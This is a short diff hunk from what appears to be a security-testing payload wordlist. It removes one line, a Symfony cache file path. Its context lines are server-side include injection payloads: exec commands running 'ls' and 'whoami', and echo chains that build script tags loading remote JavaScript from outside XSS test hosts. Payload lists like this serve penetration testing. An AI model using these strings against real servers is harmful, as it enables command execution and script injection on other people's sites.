@@ -117,7 +117,6 @@
 <pre><!--#exec cmd="ls" --></pre>
 <pre><!--#exec cmd="whoami"--></pre>
 add <!--#exec cmd="/bin/echo '<scr'"--><!--#exec cmd="/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'"-->
-app/cache/dev/annotations/sonata-adminbundle-controller-crudcontroller#configure.cache.php
 exploit string: <!--#exec cmd="/bin/echo '<script src'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></script>'"-->
 inject"'();</>=/*<!--#//
 simpl#config.xml
